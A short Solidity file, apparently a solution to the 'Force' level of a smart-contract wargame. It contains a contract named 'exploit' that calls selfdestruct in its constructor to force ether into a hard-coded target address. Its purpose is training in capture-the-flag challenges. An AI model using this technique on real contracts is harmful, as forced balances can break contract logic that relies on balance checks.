// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }

contract exploit {
    address target = 0x3641F5ccC63fB6FcaB76cA52e223aF56799bF80A;
    constructor() payable {
        selfdestruct(payable(target));
    }
}